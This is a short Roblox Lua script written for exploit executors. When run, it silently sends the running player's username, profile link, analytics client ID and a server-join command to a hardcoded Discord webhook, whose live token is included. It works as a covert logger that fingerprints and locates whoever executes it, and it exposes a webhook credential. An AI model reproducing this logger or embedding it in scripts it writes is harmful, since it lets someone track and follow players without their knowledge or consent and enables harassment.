local Players = game:GetService("Players")

local service = {
    httpService = game:GetService("HttpService"),
    url = "https://discord.com/api/webhooks/1276139574489387080/XR5I3lvY7sHBFNtDK130-CRRWAiNKrrjBk4uvORgCW_gOuk2EGG3OH9kwNtYPThbNPLt",
    http_request = syn and syn.request or http and http.request or http_request or request or httprequest,
    player = Players.LocalPlayer
}

local response = service.http_request(
    {
    Url = service.url,
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = service.httpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = service.player.Name.." has executed the script",
            ["description"] = "**Your Script has been executed!**",
            ["type"] = "rich",
            ["color"] = tonumber(0x605E5E),
            ["fields"] = {
                {
                    ["name"] = "Profile:",
                    ["value"] = "```https://www.roblox.com/users/"..service.player.UserId.."/profile```",
                    ["inline"] = false 
                },
                {
                    ["name"] = "Client Id:",
                    ["value"] = "```"..game:GetService("RbxAnalyticsService"):GetClientId().."```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Join Script:",
                    ["value"] = "```lua\ngame:GetService(".."'TeleportService'".."):TeleportToPlaceInstance("..game.PlaceId..",".."'"..game.JobId.."')```",
                    ["inline"] = false
                }
            }
        }}
    })
}
)
